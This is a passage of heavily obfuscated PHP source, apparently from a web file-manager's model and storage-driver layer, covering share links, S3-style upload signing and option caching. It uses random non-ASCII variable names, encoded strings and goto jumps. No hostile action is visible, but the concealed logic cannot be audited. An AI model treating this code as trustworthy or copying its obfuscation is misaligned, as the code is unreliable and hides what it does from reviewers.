= array_unique(array_to_keyvalue($ήβΠΩΝ‡, $Τ«Ζω[12], $Τ«Ζω[2030])); $ωη·ΛΧΘ = array_remove_value($ωη·ΛΧΘ, $Τ«Ζω[231]); if (!$ωη·ΛΧΘ) { return; } foreach ($ήβΠΩΝ‡ as $ΘΉίκ) { if (isset($ΘΉίκ[$Τ«Ζω[2040]])) { $ωη·ΛΧΘ[] = $ΘΉίκ[$Τ«Ζω[2040]][$Τ«Ζω[2030]]; } } $αΏτ¤ = $this->metaList($ωη·ΛΧΘ); if (!$αΏτ¤) { return !1; } foreach ($ήβΠΩΝ‡ as &$ΘΉίκ) { $ΘΉίκ[$Τ«Ζω[544]] = $αΏτ¤[$ΘΉίκ[$Τ«Ζω[2030]]]; if (isset($ΘΉίκ[$Τ«Ζω[2040]])) { $ΘΉίκ[$Τ«Ζω[2040]][$Τ«Ζω[544]] = $αΏτ¤[$ΘΉίκ[$Τ«Ζω[2040]][$Τ«Ζω[2030]]]; } } unset($ΘΉίκ); } private function metaList($–¦Ϋ¤†ς) { $ώΓ«ϋΠ =& $_SERVER[γγάψ½]; if (!$–¦Ϋ¤†ς) { return array(); } $Ϊƒύ«” = array($ώΓ«ϋΠ[2030] => array($ώΓ«ϋΠ[7], $–¦Ϋ¤†ς)); $·»Ι = Model($ώΓ«ϋΠ[2041])->where($Ϊƒύ«”)->select(); $·»Ι = array_to_keyvalue_group($·»Ι, $ώΓ«ϋΠ[2030]); foreach ($·»Ι as $ψΔ­ψΜ => $ΌήΈ‘’) { $΄–Ί«³Ι = array(); foreach ($ΌήΈ‘’ as $—©¦—Ί) { $΄–Ί«³Ι[$—©¦—Ί[$ώΓ«ϋΠ[97]]] = $—©¦—Ί[$ώΓ«ϋΠ[453]]; } $·»Ι[$ψΔ­ψΜ] = $΄–Ί«³Ι; } return $·»Ι ? $·»Ι : array(); } public function removeTarget($ο±΅½ω, $ώβΖά‹) { $±Άτ¨Ώώ =& $_SERVER[γγάψ½]; if (!$ώβΖά‹) { return !0; } $ώβΖά‹ = is_array($ώβΖά‹) ? $ώβΖά‹ : array($ώβΖά‹); $²¥  = array($±Άτ¨Ώώ[191] => $ο±΅½ω, $±Άτ¨Ώώ[574] => array($±Άτ¨Ώώ[7], $ώβΖά‹)); $ήΌΫΙ¥ = $this->field($±Άτ¨Ώώ[2030])->where($²¥ )->select(); $ΔιΨ®Θ = array_to_keyvalue($ήΌΫΙ¥, $±Άτ¨Ώώ[12], $±Άτ¨Ώώ[2030]); if (!$ΔιΨ®Θ) { return !0; } $²¥  = array($±Άτ¨Ώώ[2030] => array($±Άτ¨Ώώ[7], $ΔιΨ®Θ)); $this->where($²¥ )->delete(); Model($±Άτ¨Ώώ[2033])->where($²¥ )->delete(); Model($±Άτ¨Ώώ[2042])->where($²¥ )->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\145\x5f\x63\157\x6e\x74\x65\x6e\x74\163"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\124\151\155\145", "\164\x69\x6d\x65", "\151\156\163\x65\162\164", "\x66\x75\156\x63\164\151\x6f\x6e")); } goto D ΟΚ¨Έ–¨; Cκέ·ήΊΎ±: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ξ»«ρΰ) { $this->pathParse = $ξ»«ρΰ; } protected function infoParse($ωΨΌΪ¤Έ, $νΝ‹‹Χ = false) { $€’³•Ηο =& $_SERVER[γγάψ½]; return Action($€’³•Ηο[1267])->sharePathInfo($this->pathParse[$€’³•Ηο[87]], !0, $νΝ‹‹Χ); } public function listPath($©ΉμΎ ¥, $—ή‰¨Ώέ = false) { $‘νΆΛγ· =& $_SERVER[γγάψ½]; $πΩ¥Ϊ = IO::listPath($©ΉμΎ ¥, $—ή‰¨Ώέ); if (!$πΩ¥Ϊ) { return $πΩ¥Ϊ; } if (is_array($πΩ¥Ϊ[$‘νΆΛγ·[1447]])) { $¨§ΪΚΉ› = Action($‘νΆΛγ·[1456])->parsePathChildren($πΩ¥Ϊ[$‘νΆΛγ·[1447]], array($‘νΆΛγ·[498] => $©ΉμΎ ¥)); $πΩ¥Ϊ[$‘νΆΛγ·[1447]] = Action($‘νΆΛγ·[1267])->shareItemInfo($¨§ΪΚΉ›); } foreach ($πΩ¥Ϊ as $Δ‰οθ => $ώΧ–ΣΟΣ) { if (!in_array($Δ‰οθ, array($‘νΆΛγ·[86], $‘νΆΛγ·[85]))) { continue; } foreach ($ώΧ–ΣΟΣ as $ΗΙ™ςΞ¨ => $¨§ΪΚΉ›) { $¨§ΪΚΉ› = Action($‘νΆΛγ·[1456])->parsePathChildren($¨§ΪΚΉ›, array($‘νΆΛγ·[498] => $©ΉμΎ ¥)); $πΩ¥Ϊ[$Δ‰οθ][$ΗΙ™ςΞ¨] = Action($‘νΆΛγ·[1267])->shareItemInfo($¨§ΪΚΉ›); } } return $πΩ¥Ϊ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($π¤ΕΉα·) { parent::__construct($π¤ΕΉα·); $this->setSignVersion($_SERVER[γγάψ½][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($σ›·ύρθ) { parent::__construct($σ›·ύρθ); $this->setSignVersion($_SERVER[γγάψ½][250]); } public function uploadFormData($Ρ»τφϋΐ, $οΐ‚ψμ = 3600) { $όΘρτίΗ =& $_SERVER[γγάψ½]; $¶ώ§•ύΏ = $όΘρτίΗ[232]; $’μίΔω = $όΘρτίΗ[260]; $ιΟΥκ = $όΘρτίΗ[62]; $¤Ζξ‹±¶ = gmdate($όΘρτίΗ[261]); $ϊβΈΏΐΤ = gmdate($όΘρτίΗ[262]); $’δεΈµ = $όΘρτίΗ[263]; $πΆ¦οψΈ = $οΐ‚ψμ . $όΘρτίΗ[12]; $―βΡ‰Λ¦ = $όΘρτίΗ[264]; $ΓΌξβΪ” = array($this->accessKey, $ϊβΈΏΐΤ, $this->region, $ιΟΥκ, $’δεΈµ); $’Ϊ»Η = implode($όΘρτίΗ[8], $ΓΌξβΪ”); $θΘΥ»ς— = array($όΘρτίΗ[265] => gmdate($όΘρτίΗ[1431], strtotime($όΘρτίΗ[267])), $όΘρτίΗ[268] => array(array($όΘρτίΗ[269] => $this->bucket), array($όΘρτίΗ[309] => $¶ώ§•ύΏ), array($όΘρτίΗ[270], $όΘρτίΗ[271], $όΘρτίΗ[12]), array($όΘρτίΗ[270], $όΘρτίΗ[272], $όΘρτίΗ[12]), array($όΘρτίΗ[270], $όΘρτίΗ[310], $όΘρτίΗ[12]), array($όΘρτίΗ[273] => $―βΡ‰Λ¦), array($όΘρτίΗ[274] => $’Ϊ»Η), array($όΘρτίΗ[275] => $’μίΔω), array($όΘρτίΗ[276] => $¤Ζξ‹±¶), array($όΘρτίΗ[277] => $πΆ¦οψΈ))); $πΟΑΡ— = base64_encode(json_encode($θΘΥ»ς—)); $ΚΜΠτ΄’ = hash_hmac($όΘρτίΗ[278], $ϊβΈΏΐΤ, $όΘρτίΗ[279] . $this->secret, !0); $νΰώφτ‰ = hash_hmac($όΘρτίΗ[278], $this->region, $ΚΜΠτ΄’, !0); $ΠΔΊ¨€Έ = hash_hmac($όΘρτίΗ[278], $ιΟΥκ, $νΰώφτ‰, !0); $—¨ύΆ¨ = hash_hmac($όΘρτίΗ[278], $’δεΈµ, $ΠΔΊ¨€Έ, !0); $νΖ­ΥΐΈ = hash_hmac($όΘρτίΗ[278], $πΟΑΡ—, $—¨ύΆ¨); $Ϊήζ™ΰ = array($όΘρτίΗ[249] => $όΘρτίΗ[12], $όΘρτίΗ[297] => $όΘρτίΗ[12], $όΘρτίΗ[309] => $¶ώ§•ύΏ, $όΘρτίΗ[273] => $―βΡ‰Λ¦, $όΘρτίΗ[280] => $πΟΑΡ—, $όΘρτίΗ[311] => $’Ϊ»Η, $όΘρτίΗ[312] => $’μίΔω, $όΘρτίΗ[313] => $¤Ζξ‹±¶, $όΘρτίΗ[314] => $πΆ¦οψΈ, $όΘρτίΗ[315] => $νΖ­ΥΐΈ, $όΘρτίΗ[209] => $this->getHost()); return $Ϊήζ™ΰ; } } goto a¦…σΕΑ‡Δ; c»®»½: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\145\x6d\117\x70\x74\151\157\156"; public $field = array(); public function listData($¥¥Ο€©Σ = false, $ΎΩΊ’ = "\x6d\x6f\144\151\146\x79\124\x69\155\x65", $Ψ»£ό©β = false) { $ωι“‰ = Model($this->modelType)->get(!1, $this->optionType, !0); $Ρδ»¬ρ = array_values($ωι“‰); if ($Ρδ»¬ρ && $Ρδ»¬ρ[0] && !is_array($Ρδ»¬ρ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ωι“‰ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ωι“‰) { return $¥¥Ο€©Σ ? null : array(); } if (!$¥¥Ο€©Σ) { $ωι“‰ = array_filter(array_values($ωι“‰)); return array_sort_by($ωι“‰, $ΎΩΊ’, $Ψ»£ό©β); } return $ωι“‰[$_SERVER[γγάψ½][475] . $¥¥Ο€©Σ]; } public function insert($ά—Ό•΄‡) { $®Μ„―ϋ¥ =& $_SERVER[γγάψ½]; $ά—Ό•΄‡ = array_field_key($ά—Ό•΄‡, $this->field); $ΝΏ†°² = Model($this->modelType)->get($®Μ„―ϋ¥[476], $this->optionType . $®Μ„―ϋ¥[477]); $ΝΏ†°² = $ΝΏ†°² ? $ΝΏ†°² : 0; $ά—Ό•΄‡[$®Μ„―ϋ¥[478]] = ++$ΝΏ†°²; $ά—Ό•΄‡[$®Μ„―ϋ¥[234]] = time(); $ά—Ό•΄‡[$®Μ„―ϋ¥[88]] = time(); Model($this->modelType)->set($®Μ„―ϋ¥[476], $ΝΏ†°², $this->optionType . $®Μ„―ϋ¥[477]); Model($this->modelType)->set($®Μ„―ϋ¥[475] . $ΝΏ†°², $ά—Ό•΄‡, $this->optionType); return $ΝΏ†°²; } public function update($¶³¥ρ¤, $¬ΎλόΜΫ) { $ΰξΰƒ =& $_SERVER[γγάψ½]; $¬ΎλόΜΫ = array_field_key($¬ΎλόΜΫ, $this->field); $ΤΌΝτ = $this->listData($¶³¥ρ¤); if (!$ΤΌΝτ || !$¶³¥ρ¤) { return !1; } $¬ΎλόΜΫ = array_merge($ΤΌΝτ, $¬ΎλόΜΫ); $¬ΎλόΜΫ[$ΰξΰƒ[88]] = time(); return Model($this->modelType)->set($ΰξΰƒ[475] . $¶³¥ρ¤, $¬ΎλόΜΫ, $this->optionType); } public function remove($κ¦ΗΪύ) { if (!$κ¦ΗΪύ) { return !1; } return Model($this->modelType)->remove($_SERVER[γγάψ½][475] . $κ¦ΗΪύ, $this->optionType); } public function clear() { $Θ¦π•Ε• =& $_SERVER[γγάψ½]; Model($this->modelType)->remove($Θ¦π•Ε•[476], $this->optionType . $Θ¦π•Ε•[477]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Λζ¨, $•®Ο§ύΰ) { if (!$•®Ο§ύΰ) { return !1; } $Φ„¬”£ = $this->listData(); $Φ„¬”£ = array_to_keyvalue($Φ„¬”£, $Λζ¨); return isset($Φ„¬”£[$•®Ο§ύΰ]) ? $Φ„¬”£[$•®Ο§ύΰ] : !1; } public function findByName($µ½ΖΉ΄) { return $this->findByKey($_SERVER[γγάψ½][32], $µ½ΖΉ΄); } protected function resetData($ΘΝ”Θ„) { $ΟΞ„ΐΨ =& $_SERVER[γγάψ½]; $ΘΝ”Θ„ = is_array($ΘΝ”Θ„) ? $ΘΝ”Θ„ : array(); $χΩΌƒ¬ύ = array(); for ($ιµΞϊ = 0; $ιµΞϊ < count($ΘΝ”Θ„); $ιµΞϊ++) { $χΩΌƒ¬ύ[$ΟΞ„ΐΨ[475] . $ΘΝ”Θ„[$ιµΞϊ][$ΟΞ„ΐΨ[478]]] = $ΘΝ”Θ„[$ιµΞϊ]; } return Model($this->modelType)->set($χΩΌƒ¬ύ, !1, $this->optionType); } private function getAutoName($·ψι»Ε) { $¤¨ι»Ι = array_to_keyvalue($this->listData(), $_SERVER[γγάψ½][32]); if (!$¤¨ι»Ι || !isset($¤¨ι»Ι[$·ψι»Ε])) { return $·ψι»Ε; } for ($ΡνΡ· = 1; $ΡνΡ· < count($¤¨ι»Ι); $ΡνΡ·++) { $φόά«²Ώ = $·ψι»Ε . "\x28{$ΡνΡ·}\51"; if (!isset($¤¨ι»Ι[$φόά«²Ώ])) { return $φόά«²Ώ; } } return $φόά«²Ώ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($±ΝΈ°”Ό = false, $­Α£ΖΦ = '', $‚ρσ‘άΉ = false) { $δρ°±ύ‹ =& $_SERVER[γγάψ½]; $ΗΰΪ®ϊ = $this->cacheGet($­Α£ΖΦ); $ο“€Ε²  = $this->optionDefault($­Α£ΖΦ); $ο“€Ε²  = is_array($ο“€Ε² ) ? $ο“€Ε²  : array(); if (is_array($ΗΰΪ®ϊ)) { $ΗΰΪ®ϊ = array_merge($ο“€Ε² , $ΗΰΪ®ϊ); return $±ΝΈ°”Ό ? isset($ΗΰΪ®ϊ[$±ΝΈ°”Ό]) ? $ΗΰΪ®ϊ[$±ΝΈ°”Ό] : null : $ΗΰΪ®ϊ; } $·έ²ξμΜ = $this->filterWhere(array($δρ°±ύ‹[33] => $­Α£ΖΦ)); $ΗΰΪ®ϊ = $this->where($·έ²ξμΜ)->select(); $ΗΰΪ®ϊ = array_to_keyvalue($ΗΰΪ®ϊ, $δρ°±ύ‹[97], $δρ°±ύ‹[453]); foreach ($ΗΰΪ®ϊ as $™µ£πσΥ => $Ώη¥ά£ΐ) { if ($‚ρσ‘άΉ || in_array($™µ£πσΥ, $this->jsonField)) { $ΗΰΪ®ϊ[$™µ£πσΥ] = json_decode($Ώη¥ά£ΐ, !0); } } $this->cacheSet($­Α£ΖΦ, $ΗΰΪ®ϊ); $ΗΰΪ®ϊ = array_merge($ο“€Ε² , $ΗΰΪ®ϊ); return $±ΝΈ°”Ό ? $ΗΰΪ®ϊ[$±ΝΈ°”Ό] : $ΗΰΪ®ϊ; } public function set($ΒαΗ¶Κϋ, $Σ°†ƒύ΄ = false, $ΎΊ¤ο»Ι = '') { $π–ΉΘΔ =& $_SERVER[γγάψ½]; $this->cacheRemove($ΎΊ¤ο»Ι); $Οώ³ή = array(); $τήΤεϋ² = is_array($ΒαΗ¶Κϋ) ? $ΒαΗ¶Κϋ : array($ΒαΗ¶Κϋ => $Σ°†ƒύ΄); foreach ($τήΤεϋ² as $²½‘Ϋ© => $—ζάχ) { if (is_array($—ζάχ)) { $—ζάχ = json_encode_force($—ζάχ); } $this->checkLength($—ζάχ, !1, $this->tableName . $π–ΉΘΔ[4] . $ΒαΗ¶Κϋ); $—ζάχ = self::textEncode($—ζάχ); $τήΤεϋ² = array($π–ΉΘΔ[33] => $ΎΊ¤ο»Ι, $π–ΉΘΔ[97] => $²½‘Ϋ©, $π–ΉΘΔ[453] => $—ζάχ); $Οώ³ή[] = $this->filterWhere($τήΤεϋ²); } if (!$Οώ³ή) { return !0; } $Φλωγ‰¶ = $this->cacheKey($π–ΉΘΔ[479]); CacheLock::lock($Φλωγ‰¶); $Ϋ°Ή°πΝ = $this->addAll($Οώ³ή, array(), !0); CacheLock::unlock($Φλωγ‰¶); return $Ϋ°Ή°πΝ; } protected function optionDefault($ΠΈΓ±Σ = '') { return !1; } public function setDeep($κλφ¬ύζ, $ΟΓΣ―Θ” = false, $΄ηƒ΄η = '') { $³Χλ¨Ι = explode($_SERVER[γγάψ½][10], $κλφ¬ύζ); $®ί­±Ξ = $this->get(); array_set_value($®ί­±Ξ, $κλφ¬ύζ, $ΟΓΣ―Θ”); $this->set($³Χλ¨Ι[0], $®ί­±Ξ[$³Χλ¨Ι[0]], $΄ηƒ΄η); } public function remove($£ΩΝΡµ, $ΑΊΪ·° = '') { $ϋ†εχ³ =& $_SERVER[γγάψ½]; $this->cacheRemove($ΑΊΪ·°); $–θκω‡” = $this->filterWhere(array($ϋ†εχ³[97] => $£ΩΝΡµ, $ϋ†εχ³[33] => $ΑΊΪ·°)); if (is_null($£ΩΝΡµ)) { unset($–θκω‡”[$ϋ†εχ³[97]]); } return $this->where($–θκω‡”)->delete(); } public function cacheSet($©΄βΉΛ‡, $–Όλ®ΌΎ = false) { return Cache::set($this->cacheKey($©΄βΉΛ‡), $–Όλ®ΌΎ); } public function cacheGet($φΤ­γ¥Χ) { return Cache::get($this->cacheKey($φΤ­γ¥Χ)); } public function cacheRemove($ΧΜιαΨ›) { return Cache::remove($this->cacheKey($ΧΜιαΨ›)); } protected function filterWhere($ΒΩθ½Τ„) { return $ΒΩθ½Τ„; } protected function cacheKey($ σιΞ‚Ά) { return $ σιΞ‚Ά; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\x6d\145" => "\151\157\137\163\x6f\x75\162\143\x65\x5f\155\x65\164\x61", "\155\145\164\141\106\x69\x65\x6c\144" => "\163\157\x75\162\x63\145\x49\104"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\x54\151\155\x65", "\164\x69\155\x65", "\151\156\x73\145\x72\164", "\x66\165\156\143\x74\x69\x6f\x6e"), array("\143\162\x65\x61\164\145\124\151\155\x65", "\164\x69\x6d\145", "\151\156\163\145\162\164", "\x66\165\x6e\x63\164\151\x6f\156"), array("\166\151\x65\x77\124\151\155\145", "\x74\x69\155\x65", "\x69\156\x73\145\x72\164", "\146\165\x6e\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($γτυ¦Νη) { return $this->listSource(array($_SERVER[γγάψ½][480] => $γτυ¦Νη)); } public function typeName($―έΣ·) { static $—Ν­ΰ = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\x6d", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\x67\162\x6f\165\x70"); return $—Ν­ΰ[$―έΣ· . $_SERVER[γγάψ½][12]]; } public function sourceListInfo($ΐµ¤΅•, $€—ƒΟΦε = false) { $­΅¦°‚’ =& $_SERVER[γγάψ½]; $ΐµ¤΅• = $ΐµ¤΅• ? $ΐµ¤΅• : array(); $ΐµ¤΅• = array_filter(array_unique($ΐµ¤΅•)); if (!$ΐµ¤΅•) { return array(); } $”’ΠΠΘΑ = $this->where(array($­΅¦°‚’[194] => array($­΅¦°‚’[7], $ΐµ¤΅•)))->select(); $this->_listDataApply($”’ΠΠΘΑ, $€—ƒΟΦε); return array_to_keyvalue($”’ΠΠΘΑ, $­΅¦°‚’[194]); } public function pathInfoFilter(&$ξ΅§ς„µ) { $§ΙΆΦκΫ =& $_SERVER[γγάψ½]; static $ΗαΡΐ = false; static $¶θ¨τθϊ = false; static $²­άμ¥  = false; if (!$ΗαΡΐ) { $λζΘΧ© = $§ΙΆΦκΫ[481]; $λζΘΧ© .= $§ΙΆΦκΫ[482]; $λζΘΧ© .= $§ΙΆΦκΫ[483]; $Ι¥ “ = $§ΙΆΦκΫ[484]; $¤ΛΌ­λϋ = explode($§ΙΆΦκΫ[50], $Ι¥ “); $ΗαΡΐ = explode($§ΙΆΦκΫ[50], $λζΘΧ©); $¶θ¨τθϊ = array(); foreach ($ΗαΡΐ as $„ωψ¶ΒΙ) { if (in_array($„ωψ¶ΒΙ, $¤ΛΌ­λϋ)) { continue; } $¶θ¨τθϊ[] = $„ωψ¶ΒΙ; } $²­άμ¥  = explode($§ΙΆΦκΫ[50], $§ΙΆΦκΫ[485]); } foreach ($²­άμ¥  as $Λη‹Άλν) { if (isset($ξ΅§ς„µ[$Λη‹Άλν])) { $ξ΅§ς„µ[$Λη‹Άλν] = intval($ξ΅§ς„µ[$Λη‹Άλν]); } } $ξ΅§ς„µ[$§ΙΆΦκΫ[87]] = $§ΙΆΦκΫ[486] . $ξ΅§ς„µ[$§ΙΆΦκΫ[194]] . $§ΙΆΦκΫ[487]; $ξ΅§ς„µ[$§ΙΆΦκΫ[33]] = $ξ΅§ς„µ[$§ΙΆΦκΫ[488]] == 1 ? $§ΙΆΦκΫ[78] : $§ΙΆΦκΫ[233]; $ξ΅§ς„µ[$§ΙΆΦκΫ[191]] = $this->typeName($ξ΅§ς„µ[$§ΙΆΦκΫ[191]]); if ($ξ΅§ς„µ[$§ΙΆΦκΫ[488]] != 1) { $ξ΅§ς„µ[$§ΙΆΦκΫ[169]] = $ξ΅§ς„µ[$§ΙΆΦκΫ[489]]; unset($ξ΅§ς„µ[$§ΙΆΦκΫ[489]]); } $Υε‚ήέ™ = $ΗαΡΐ; if (isset($ξ΅§ς„µ[$§ΙΆΦκΫ[490]]) && $ξ΅§ς„µ[$§ΙΆΦκΫ[490]][$§ΙΆΦκΫ[491]] == -1) { $Υε‚ήέ™ = $¶θ¨τθϊ; } $ξ΅§ς„µ = array_field_key($ξ΅§ς„µ, $Υε‚ήέ™); return $ξ΅§ς„µ; } public function listUserFav() { $‘Δ‘΅ =& $_SERVER[γγάψ½]; $ΎάΓπ = Model($‘Δ‘΅[492])->listData(); $‹‰ζώ¬ = array_filter_by_field($ΎάΓπ, $‘Δ‘΅[33], $‘Δ‘΅[493]); $‹‰ζώ¬ = array_to_keyvalue($‹‰ζώ¬, $‘Δ‘΅[12], $‘Δ‘΅[87]); if ($‹‰ζώ¬) { $θ­…ηΞ = $this->listSource(array($‘Δ‘΅[494] => array($‘Δ‘΅[495], $‹‰ζώ¬))); } $θ­…ηΞ = array_to_keyvalue($θ­…ηΞ[$‘Δ‘΅[448]], $‘Δ‘΅[194]); foreach ($ΎάΓπ as &$ΪιΗΞ) { $ΪιΗΞ = array($‘Δ‘΅[496] => $ΪιΗΞ[$‘Δ‘΅[478]], $‘Δ‘΅[497] => $ΪιΗΞ[$‘Δ‘΅[32]], $‘Δ‘΅[498] => $ΪιΗΞ[$‘Δ‘΅[87]], $‘Δ‘΅[499] => $ΪιΗΞ[$‘Δ‘΅[33]], $‘Δ‘΅[500] => $ΪιΗΞ[$‘Δ‘΅[234]], $‘Δ‘΅[501] => $ΪιΗΞ[$‘Δ‘΅[88]]); if ($ΪιΗΞ[$‘Δ‘΅[33]] == $‘Δ‘΅[493] && $θ­…ηΞ[$ΪιΗΞ[$‘Δ‘΅[87]]]) { $ΪιΗΞ[$‘Δ‘΅[90]] = $θ­…ηΞ[$ΪιΗΞ[$‘Δ‘΅[87]]]; } } unset($ΪιΗΞ); return $ΎάΓπ; } public function listUserTag($ηΕµΗ) { $§Λ΄±Όπ =& $_SERVER[γγάψ½]; if ($ηΕµΗ && !is_array($ηΕµΗ)) { $ηΕµΗ = array($ηΕµΗ); } $ν«Πζ½ = Model($§Λ΄±Όπ[502])->listData(); $¨Κ·—ω = array(); $Π‚θΘσ = array(); foreach ($ν«Πζ½ as $Αμ»ΩΨΒ) { $ίΈέΏΨ‡ = $Αμ»ΩΨΒ[$§Λ΄±Όπ[87]]; if (!$ίΈέΏΨ‡) { continue; } if (!isset($Π‚θΘσ[$ίΈέΏΨ‡])) { $Π‚θΘσ[$ίΈέΏΨ‡] = array(); } $Π‚θΘσ[$ίΈέΏΨ‡][] = $Αμ»ΩΨΒ[$§Λ΄±Όπ[503]]; $¨Κ·—ω[$Αμ»ΩΨΒ[$§Λ΄±Όπ[87]]] = $Αμ»ΩΨΒ; } $αΆ€ΩΧΫ = array(); $φ®¨ = array(); $άψ½ο­Ρ = array(); foreach ($Π‚θΘσ as $ξ²®‚Ε => $°—πΑ) { $ζ―Σ•™Ν = !0; if (!$ηΕµΗ) { $αΆ€ΩΧΫ[] = $ξ²®‚Ε; continue; } foreach ($ηΕµΗ as $ΌΤΔΑξ) { if (!in_array($ΌΤΔΑξ, $°—πΑ)) { $ζ―Σ•™Ν = !1; break; } } if (!$ζ―Σ•™Ν) { continue; } if (!is_numeric($ξ²®‚Ε)) { $άωΆΎκ = $¨Κ·—ω[$ξ²®‚Ε]; $δΔΆ† = array($§Λ΄±Όπ[32] => $άωΆΎκ[$§Λ΄±Όπ[32]], $§Λ΄±Όπ[87] => $άωΆΎκ[$§Λ΄±Όπ[87]], $§Λ΄±Όπ[33] => $άωΆΎκ[$§Λ΄±Όπ[33]], $§Λ΄±Όπ[90] => array($§Λ΄±Όπ[504] => 1), $§Λ΄±Όπ[235] => !0); if ($άωΆΎκ[$§Λ΄±Όπ[33]] == $§Λ΄±Όπ[233]) { $άψ½ο­Ρ[] = $δΔΆ†; } if ($άωΆΎκ[$§Λ΄±Όπ[33]] == $§Λ΄±Όπ[78]) { $φ®¨[] = $δΔΆ†; } continue; } $αΆ€ΩΧΫ[] = $ξ²®‚Ε; } if ($αΆ€ΩΧΫ) { $ήΠΝΏ = $this->listSource(array($§Λ΄±Όπ[494] => array($§Λ΄±Όπ[495], $αΆ€ΩΧΫ))); } $ήΠΝΏ = $ήΠΝΏ ? $ήΠΝΏ : array($§Λ΄±Όπ[85] => array(), $§Λ΄±Όπ[86] => array()); $ήΠΝΏ[$§Λ΄±Όπ[85]] = array_merge($ήΠΝΏ[$§Λ΄±Όπ[85]], $φ®¨); $ήΠΝΏ[$§Λ΄±Όπ[86]] = array_merge($ήΠΝΏ[$§Λ΄±Όπ[86]], $άψ½ο­Ρ); if (isset($ήΠΝΏ[$§Λ΄±Όπ[445]]) && count($αΆ€ΩΧΫ) == $ήΠΝΏ[$§Λ΄±Όπ[445]][$§Λ΄±Όπ[446]]) { return $ήΠΝΏ; } $…Δ³β = array(); $ϋ΅Ηλέψ = array_to_keyvalue($ήΠΝΏ[$§Λ΄±Όπ[85]], $§Λ΄±Όπ[12], $§Λ΄±Όπ[194]); $έΤΦΞ¨ = array_to_keyvalue($ήΠΝΏ[$§Λ΄±Όπ[86]], $§Λ΄±Όπ[12], $§Λ΄±Όπ[194]); $±τΥχ = array_merge($έΤΦΞ¨, $ϋ΅Ηλέψ); foreach ($αΆ€ΩΧΫ as $ίΈέΏΨ‡) { if (!in_array($ίΈέΏΨ‡, $±τΥχ)) { $…Δ³β[] = $ίΈέΏΨ‡; } } if ($…Δ³β) { Model($§Λ΄±Όπ[505])->removeBySource($…Δ³β); } return $ήΠΝΏ; } public function listUserRecycle() { $ΠύΝορ =& $_SERVER[γγάψ½]; $²πσ§β = Model($ΠύΝορ[506])->listData(); if (!$²πσ§β) { return array(); } $²ΈΕώ = array($ΠύΝορ[494] => array($ΠύΝορ[495], $²πσ§β), $ΠύΝορ[507] => 1); return $this->listSource($²ΈΕώ); } public function listSource($€Ϊα°, $·λύιΈΊ = 3000, $Π·εΓ µ = false) { $φδ―οζ‰ =& $_SERVER[γγάψ½]; if (!isset($€Ϊα°[$φδ―οζ‰[508]])) { $€Ϊα°[$φδ―οζ‰[508]] = 0; } if (isset($€Ϊα°[$φδ―οζ‰[193]]) && $€Ϊα°[$φδ―οζ‰[193]] == $φδ―οζ‰[231]) { $€Ϊα°[$φδ―οζ‰[489]] = array($φδ―οζ‰[509], $φδ―οζ‰[12]); } $¨νΏΗ³– = $φδ―οζ‰[510]; $‰ψµΈ¤Ψ = $this->field($¨νΏΗ³–)->_makeOrder()->where($€Ϊα°)->selectPage($·λύιΈΊ); $this->_listPageCheck($‰ψµΈ¤Ψ, $¨νΏΗ³–, $€Ϊα°); $this->_listDataApply($‰ψµΈ¤Ψ[$φδ―οζ‰[448]], $Π·εΓ µ); $this->_listMake($‰ψµΈ¤Ψ); return $‰ψµΈ¤Ψ; } private function _listPageCheck(&$τηΝόΏ, $“Υά°­», $ϋΊ‘) { $²¶ΙΏύΛ =& $_SERVER[γγάψ½]; if (!is_array($τηΝόΏ[$²¶ΙΏύΛ[445]])) { return; } $‚Ψύ§ω… = $τηΝόΏ[$²¶ΙΏύΛ[445]]; if ($‚Ψύ§ω…[$²¶ΙΏύΛ[447]] <= 1) { return; } if ($‚Ψύ§ω…[$²¶ΙΏύΛ[446]] >= 100000) { return; } if (Model($²¶ΙΏύΛ[511])->get($²¶ΙΏύΛ[512]) != $²¶ΙΏύΛ[513]) { return; } $“Υά°­» = str_replace(array($²¶ΙΏύΛ[53], $²¶ΙΏύΛ[420], $²¶ΙΏύΛ[288]), $²¶ΙΏύΛ[12], $“Υά°­»); $“Υά°­» = $²¶ΙΏύΛ[514] . str_replace($²¶ΙΏύΛ[50], $²¶ΙΏύΛ[515], $“Υά°­») . $²¶ΙΏύΛ[516]; $λΠ±ϊ΄— = $²¶ΙΏύΛ[517]; $λΠ±ϊ΄— = $λΠ±ϊ΄— . $²¶ΙΏύΛ[518]; $£Τγ£Κύ = $‚Ψύ§ω…[$²¶ΙΏύΛ[442]] * ($‚Ψύ§ω…[$²¶ΙΏύΛ[431]] - 1) . $²¶ΙΏύΛ[50] . $‚Ψύ§ω…[$²¶ΙΏύΛ[442]]; $ΰ¤³›χ– = $this->_makeOrder(!0); $θ°ό—…Ν = $²¶ΙΏύΛ[514] . str_replace($²¶ΙΏύΛ[50], $²¶ΙΏύΛ[515], $ΰ¤³›χ–[0]); if (strpos($θ°ό—…Ν, $²¶ΙΏύΛ[519])) { $θ°ό—…Ν = str_replace($²¶ΙΏύΛ[519], $²¶ΙΏύΛ[520], $θ°ό—…Ν); } else { $θ°ό—…Ν .= $²¶ΙΏύΛ[521] . $ΰ¤³›χ–[1]; } $ΎπΉΎ = array(); foreach ($ϋΊ‘ as $ΡγΩ›Χ => $ήΪ›φήΨ) { $ΎπΉΎ[$²¶ΙΏύΛ[514] . 